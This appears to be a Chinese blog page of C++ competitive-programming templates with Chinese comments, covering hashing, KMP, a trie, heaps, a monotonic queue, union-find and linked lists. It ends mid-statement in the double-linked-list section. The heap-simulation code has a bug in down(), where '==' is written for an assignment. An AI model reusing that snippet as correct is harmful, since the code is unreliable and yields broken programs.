<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><h3 id="一般哈希"><a href="#一般哈希" class="headerlink" title="一般哈希"></a>一般哈希</h3><h4 id="拉链法"><a href="#拉链法" class="headerlink" title="拉链法"></a><strong>拉链法</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const int N = 100003;//一般mol的数要选择一个质数</span><br><span class="line">int h[N],e[N],ne[N],idx;</span><br><span class="line">void insert(int x) &#123;</span><br><span class="line">	//将x映射到哈希函数上</span><br><span class="line">	int k = (x % N + N) % N;</span><br><span class="line">	e[idx] = x, ne[idx] = h[k], h[k] = idx++;//单链表的插入</span><br><span class="line">&#125;</span><br><span class="line">bool find(int x) &#123;</span><br><span class="line">	int k = (x % N + N) % N;//k是映射到哈希函数上的值，使得复数mol完后变成一个整数，在c++中负数mol完会变成负数</span><br><span class="line">	for (int i = h[k]; i != -1; i = ne[i]) &#123;</span><br><span class="line">		if (e[i] == x)</span><br><span class="line">			return true;&#125;</span><br><span class="line">	return false;//return false 是最后的判断，若是找不到就返回false</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">	int n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	memset(h, -1, sizeof h);//所有初始化,初始化为-1,拉链法</span><br><span class="line">	while (n--) &#123;</span><br><span class="line">		char op[2];</span><br><span class="line">		int x;</span><br><span class="line">		cin &gt;&gt; op &gt;&gt; x;</span><br><span class="line">		if (op[0] == &#x27;I&#x27;)insert(x);</span><br><span class="line">		else &#123;</span><br><span class="line">			if (find(x))cout &lt;&lt; &quot;yes&quot;&lt;&lt;endl;</span><br><span class="line">			else cout &lt;&lt; &quot;No&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="开放寻址法"><a href="#开放寻址法" class="headerlink" title="开放寻址法"></a><strong>开放寻址法</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200003</span>, null = <span class="number">0x3f3f3f3f</span>;<span class="comment">//null是数据取不到的，开了两倍的坑位</span></span><br><span class="line"><span class="type">int</span> h[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="comment">//上厕所法，返回要存放的位置或者是他在的地方</span></span><br><span class="line">	<span class="type">int</span> k = (x % N + N) % N;   </span><br><span class="line">	<span class="keyword">while</span> (h[k] != null &amp;&amp; h[k] != x) &#123;</span><br><span class="line">		k++;</span><br><span class="line">		<span class="keyword">if</span> (k == N)k = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="built_in">memset</span>(h, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> h);<span class="comment">//memset是针对字节memset，h数组有四个字节，每个字节都是ox3f </span></span><br><span class="line">	<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">		<span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		cin &gt;&gt; op&gt;&gt;x;</span><br><span class="line">		<span class="type">int</span> k = <span class="built_in">find</span>(x);</span><br><span class="line">		<span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)h[k] = x;</span><br><span class="line">		<span class="keyword">else</span> &#123;<span class="keyword">if</span> (h[k] != null)cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符串哈希"><a href="#字符串哈希" class="headerlink" title="字符串哈希"></a>字符串哈希</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//思路:存放str，同时进行m次询问，利用前缀和预处理，进行p进制转换</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>,t=<span class="number">131</span>;<span class="comment">//将字母转化为t进制的数，将字符串的哈希值进行比较</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ull;<span class="comment">//用ull则溢出的话就认为是取模于2的64次方</span></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> str[N];</span><br><span class="line">ull h[N], p[N];</span><br><span class="line"><span class="function">ull <span class="title">get</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> h[r] - h[l - <span class="number">1</span>] * p[r - l + <span class="number">1</span>];<span class="comment">//求l和r之间字符串的哈希值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; str+<span class="number">1</span>;<span class="comment">//str+1表示第0位不放数据</span></span><br><span class="line">	p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		p[i] = p[i - <span class="number">1</span>] * t;<span class="comment">//表示次方</span></span><br><span class="line">		h[i] = h[i - <span class="number">1</span>] * t + str[i];<span class="comment">//将他变为数字</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; str[1] &lt;&lt; &quot; &quot; &lt;&lt; h[1];</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		<span class="type">int</span> l1, r1, l2, r2;</span><br><span class="line">		cin &gt;&gt; l1 &gt;&gt; r1 &gt;&gt; l2 &gt;&gt; r2;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">get</span>(l1, r1) == <span class="built_in">get</span>(l2, r2)) cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="kmp算法"><a href="#kmp算法" class="headerlink" title="kmp算法"></a>kmp算法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//p是模板串,s是长文本</span><br><span class="line">char p[N], s[M];</span><br><span class="line">int ne[N];</span><br><span class="line">int main() &#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; p + 1 &gt;&gt; m &gt;&gt; s + 1;//p+1是指从第一位开始存</span><br><span class="line">	//求next的过程,模板串</span><br><span class="line">	for (int i = 2, j = 0; i &lt;= n; i++) &#123;//这里的ne【i】指的是前1-i项构成的序列中前缀和后缀相同的长度</span><br><span class="line">		while (j &amp;&amp; p[i] != p[j + 1])j = ne[j];</span><br><span class="line">		if (p[i] == p[j + 1])j++;</span><br><span class="line">		ne[i] = j;</span><br><span class="line">	&#125;</span><br><span class="line">	//kmp 匹配过程</span><br><span class="line">	for (int i = 1, j = 0; i &lt;= m; i++) &#123;</span><br><span class="line">		while (j &amp;&amp; s[i] != p[j + 1])j = ne[j];</span><br><span class="line">		if (s[i] == p[j + 1])j++;</span><br><span class="line">		if (j == n) &#123;</span><br><span class="line">			cout &lt;&lt; i - n&lt;&lt;&quot; &quot;;</span><br><span class="line">			j = ne[j];//匹配成功</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;									</span><br></pre></td></tr></table></figure>

<h3 id="trie字典树"><a href="#trie字典树" class="headerlink" title="trie字典树"></a>trie字典树</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//高效存储和查询字符串集合的数据结构</span><br><span class="line">//通过一颗多分枝的树来高效存储,每一个分支都是一个字符串</span><br><span class="line">int son[N][26],cnt[N],idx;//下标是0的点,既是空节点,又是根节点</span><br><span class="line">char str[N];//输入字符串</span><br><span class="line">void insert(char str[]) &#123;//输入一整个字符串</span><br><span class="line">	int p = 0;</span><br><span class="line">	for (int i = 0; str[i]; i++) &#123;</span><br><span class="line">		int u = str[i] - &#x27;a&#x27;;//将字符串转化成数字</span><br><span class="line">		if (!son[p][u])son[p][u] = ++idx;//idx储存的是当前用到的下标,下标唯一，往里面存储位置</span><br><span class="line">		p = son[p][u];</span><br><span class="line">	&#125;</span><br><span class="line">	cnt[p]++;//p是标记，类似于终止标记</span><br><span class="line">	//注意这里son[0][]存的是字符串的第一个字母，之后p会++，若该存的位置有被占用了，则会跳过，p自动继承，进行下一次循环</span><br><span class="line">&#125;</span><br><span class="line">int query(char str[]) &#123;</span><br><span class="line">	int p = 0;</span><br><span class="line">	for (int i = 0; str[i]; i++) &#123;</span><br><span class="line">		int u = str[i] - &#x27;a&#x27;;</span><br><span class="line">		if (!son[p][u])return 0;</span><br><span class="line">		p = son[p][u];</span><br><span class="line">	&#125;</span><br><span class="line">	return cnt[p];</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">	int n;</span><br><span class="line">	cin &gt;&gt; n;//n为n次操作</span><br><span class="line">	while (n--) &#123;</span><br><span class="line">		char op[2];</span><br><span class="line">		cin &gt;&gt; op;</span><br><span class="line">		cin &gt;&gt; str;</span><br><span class="line">		if (op[0] == &#x27;I&#x27;)insert(str);//执行插入操作</span><br><span class="line">		else cout &lt;&lt; query(str);//执行寻找操作</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二维前缀和差分"><a href="#二维前缀和差分" class="headerlink" title="二维前缀和差分"></a>二维前缀和差分</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//要有开始，要有结尾</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> x2, <span class="type">int</span> y2, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">	b[x1][y1] += c;</span><br><span class="line">	b[x2 + <span class="number">1</span>][y1] -= c;</span><br><span class="line">	b[x1][y2 + <span class="number">1</span>] -= c;</span><br><span class="line">	b[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += c;<span class="comment">//这是一个重要的预处理步骤</span></span><br><span class="line">	<span class="comment">//不仅在前面完成了b数组的初始化，并且在插入过程中完成的b的增值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m,q, x1, x2, y1, y2,c;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; q;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			cin &gt;&gt; a[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="comment">//初始化a数组</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			<span class="built_in">insert</span>( i,  j,  i,  j, a[i][j]);<span class="comment">//先遍历一遍数组b，进行插入,使得b是a的差分</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (q--)</span><br><span class="line">	&#123;</span><br><span class="line">		cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; c;</span><br><span class="line">		<span class="built_in">insert</span>(x1, y1, x2, y2, c);</span><br><span class="line">		<span class="comment">//再求b的前缀和</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			<span class="comment">//求数组b的前缀和</span></span><br><span class="line">			b[i][j] += b[i - <span class="number">1</span>][j] + b[i][j - <span class="number">1</span>] - b[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// 因为我们最后要求的是加完了c后的a数组，而b的前缀和是a数组，所以我们直接算出b的前缀和就行</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			cout &lt;&lt; b[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//堆排序</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.插入一个数heap[++size]=x;up(size);</span></span><br><span class="line"><span class="comment">2.求集合中最小值 heap(1);heap从零开始则左右子树不一致，不太方便</span></span><br><span class="line"><span class="comment">3.删除最小值     heapp[1]=heap[size];size--;down(1);	</span></span><br><span class="line"><span class="comment">4.删除任意一个元素 heap[k]=heap[size];size--;down(k)/up(k</span></span><br><span class="line"><span class="comment">5.修改任意一个元素heap(k)=x；down(k)/up(k)</span></span><br><span class="line"><span class="comment">小根堆：每个点都满足小于等于左右两边的son</span></span><br><span class="line"><span class="comment">存储方式：用一个一维数组来存，一号点为根节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> h[N], s,m,n;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> t = u;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t])t = u * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t])t = u * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (t != u) &#123;</span><br><span class="line">		<span class="built_in">swap</span>(h[t], h[u]);</span><br><span class="line">		<span class="built_in">down</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">up</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (u / <span class="number">2</span> &amp;&amp; h[u / <span class="number">2</span>] &gt; h[u])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(h[u / <span class="number">2</span>], h[u]);</span><br><span class="line">		u /= <span class="number">2</span>;   </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)cin &gt;&gt; h[i];</span><br><span class="line">	s = n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = n/<span class="number">2</span> ; i; i--)<span class="built_in">down</span>(i);<span class="comment">// 用n/2是为了因为降低时间复杂度，因为最后一层二叉树占接近全部的一半</span></span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		cout &lt;&lt; h[<span class="number">1</span>];</span><br><span class="line">		h[<span class="number">1</span>]=h[s];</span><br><span class="line">		s--;</span><br><span class="line">		<span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="堆模拟"><a href="#堆模拟" class="headerlink" title="堆模拟"></a>堆模拟</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span>  m;</span><br><span class="line"><span class="type">int</span> h[N], ph[N], hp[N], s;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hswap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">swap</span>(ph[hp[a]], ph[hp[b]]);</span><br><span class="line">	<span class="built_in">swap</span>(hp[a], hp[b]);</span><br><span class="line">	<span class="built_in">swap</span>(h[a], h[b]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> t = u;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t])t == u * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t])t == u * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (u != t) &#123;</span><br><span class="line">		<span class="built_in">hswap</span>(t, u);</span><br><span class="line">		<span class="built_in">down</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (u / <span class="number">2</span> &amp;&amp; h[u / <span class="number">2</span>] &gt; h[u])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">hswap</span>(u / <span class="number">2</span>, u);</span><br><span class="line">		u /= <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n,k,x;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">		<span class="type">char</span> op[<span class="number">3</span>];</span><br><span class="line">		cin &gt;&gt; op;</span><br><span class="line">		<span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">			cin &gt;&gt; x;</span><br><span class="line">			s++;<span class="comment">//在堆中的位置</span></span><br><span class="line">			m++;<span class="comment">//在次序中的位置</span></span><br><span class="line">			ph[m] = s;</span><br><span class="line">			hp[s] = m;<span class="comment">//两者类似反函数，互相映射</span></span><br><span class="line">			h[s] = x;</span><br><span class="line">			<span class="built_in">up</span>(s);<span class="comment">//最末尾往上up</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;P&#x27;</span> &amp;&amp; op[<span class="number">1</span>] == <span class="string">&#x27;M&#x27;</span>) cout &lt;&lt; h[<span class="number">1</span>];<span class="comment">//输出集合中最小值</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span> &amp;&amp; op[<span class="number">1</span>] == <span class="string">&#x27;M&#x27;</span>) &#123;<span class="comment">//删除集合中最小值</span></span><br><span class="line">			<span class="built_in">hswap</span>(<span class="number">1</span>, s);</span><br><span class="line">			s--;</span><br><span class="line">			<span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span>) &#123;<span class="comment">//删除第k个插入的数</span></span><br><span class="line">			cin &gt;&gt; k;</span><br><span class="line">			k = ph[k];<span class="comment">//新的位置</span></span><br><span class="line">			<span class="built_in">hswap</span>(k, s);</span><br><span class="line">			s--;</span><br><span class="line">			<span class="built_in">down</span>(k), <span class="built_in">up</span>(k);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;<span class="comment">// C  修改第k个插入的数</span></span><br><span class="line">			cin &gt;&gt; k &gt;&gt; x;</span><br><span class="line">			k = ph[k];</span><br><span class="line">			h[k] = x;</span><br><span class="line">			<span class="built_in">down</span>(k), <span class="built_in">up</span>(k);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="单调队列之滑动窗口"><a href="#单调队列之滑动窗口" class="headerlink" title="单调队列之滑动窗口"></a>单调队列之滑动窗口</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[N], q[N];<span class="comment">//a[N]表示数的存放集合,q[N]表示数的下标的集合</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> hh = <span class="number">0</span>;<span class="comment">//hh判断队列长度，hh是队尾</span></span><br><span class="line">	<span class="type">int</span> tt = <span class="number">-1</span>;<span class="comment">//tt表示次序，tt是对头</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="comment">//判断对头是否已经滑出窗口</span></span><br><span class="line">		<span class="keyword">while</span> (hh &lt;= tt &amp;&amp; i - k + <span class="number">1</span> &gt; q[hh])hh++;<span class="comment">//while肯定行,但一次肯定是一个出,所以用if也行</span></span><br><span class="line">		<span class="keyword">while</span> (hh &lt;= tt &amp;&amp; a[q[tt]] &gt;= a[i])tt--;<span class="comment">//要构造一个单调递增数列</span></span><br><span class="line">		q[++tt] = i;<span class="comment">//把下标该放的位置</span></span><br><span class="line">		<span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>)cout &lt;&lt; a[q[hh]] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><h3 id="普通并查集"><a href="#普通并查集" class="headerlink" title="普通并查集"></a>普通并查集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//反集,将a和n+b,n+a和b分别合并，种类并查集</span><br><span class="line">//并查集巧妙地利用了递归，每次更新后都会形成新的集合，同时用递归对路迳进行了压缩</span><br><span class="line">int n, m;</span><br><span class="line">int p[N];</span><br><span class="line">int find(int x) &#123;//返回x的祖宗节点,同时对路径进行压缩</span><br><span class="line">	if (p[x] != x)p[x] = find(p[x]);//采用递归,找到他的父节点,同时进行了路径压缩,便于优化后面的索</span><br><span class="line">	return p[x];//最后求出祖宗节点</span><br><span class="line"> &#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	for (int i = 1; i &lt;= n; i++)p[i]=i;//初始化数组p,使得每个都是其父节点,从i等于1开始</span><br><span class="line">	while (m--) &#123;</span><br><span class="line">		char op[2];</span><br><span class="line">		int a, b;</span><br><span class="line">		cin &gt;&gt; op &gt;&gt; a &gt;&gt; b;</span><br><span class="line">		if (op[0] == &#x27;M&#x27;)p[find(a)] = find(b);//祖宗节点的父节点为b的祖宗节点,使得a的祖宗节点放在b的祖宗节点下达到合并集合的效果</span><br><span class="line">		else &#123;</span><br><span class="line">			if (find(a) == find(b))cout &lt;&lt; &quot;Yes&quot;;</span><br><span class="line">			else cout &lt;&lt; &quot;No&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="size的维护"><a href="#size的维护" class="headerlink" title="size的维护"></a>size的维护</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//p[]存每个点的祖宗节点，size[]只有祖宗节点的有意义，表示祖宗节点所在集合中点的数量</span></span><br><span class="line"><span class="type">int</span> p[N],size[N];</span><br><span class="line"><span class="comment">//返回x的祖宗节点</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p[x]!=x) p[x]=<span class="built_in">find</span>(p[x]);</span><br><span class="line">    <span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化，假定节点编号为1~n</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">    p[i]=i;</span><br><span class="line">    size[i]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//合并a和b所在的两个集合</span></span><br><span class="line">size[<span class="built_in">find</span>(b)]+=size[<span class="built_in">find</span>(a)];</span><br><span class="line">p[<span class="built_in">find</span>(a)]=<span class="built_in">find</span>(b);</span><br></pre></td></tr></table></figure>

<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">const int N = 100010;</span><br><span class="line">//head=头结点,e[i]表示节点i的值,ne【i】表示节点i的next指针,idx表示储存的点的次序</span><br><span class="line">int head, e[N], ne[N], idx;</span><br><span class="line">void init() &#123;</span><br><span class="line">	head = -1;</span><br><span class="line">	idx = 0;</span><br><span class="line">&#125;//对head和idx进行初始化</span><br><span class="line">//将x插到头结点</span><br><span class="line">void addhead(int x) &#123;</span><br><span class="line">	e[idx] = x, ne[idx] = head, head = idx++;</span><br><span class="line">&#125;</span><br><span class="line">void addk(int k,int x) &#123;</span><br><span class="line">	e[idx] = x;</span><br><span class="line">	ne[idx] = ne[k];</span><br><span class="line">	ne[k] = idx;</span><br><span class="line">	idx++;</span><br><span class="line">&#125;//将x插到k后面，和头插法没什么区别</span><br><span class="line">//将下标是k后面的一个点删掉</span><br><span class="line">void remove(int k) &#123;</span><br><span class="line">	ne[k] = ne[ne[k]];//链表是一个递归，可以理解为ne记录的是下一个数据的idx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> m,k,x;</span><br><span class="line"><span class="type">int</span> e[N], l[N], r[N], idx;</span><br><span class="line"><span class="comment">//类似单链表进行初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//0表示左端点，1表示右端点</span></span><br><span class="line">	l[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	r[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//r表示从左往右，l表示从右往左</span></span><br><span class="line">	idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在下表是k的右边边插入一个点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addk</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	e[idx] = x;</span><br><span class="line">	r[idx] = r[k];</span><br><span class="line">	l[idx] = k;</span><br><span class="line">	l[r[k]] = idx;</span><br><span class="line">	r[k] = idx;</span><br><span class="line">	idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除第k个点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">	r[l[k]] = 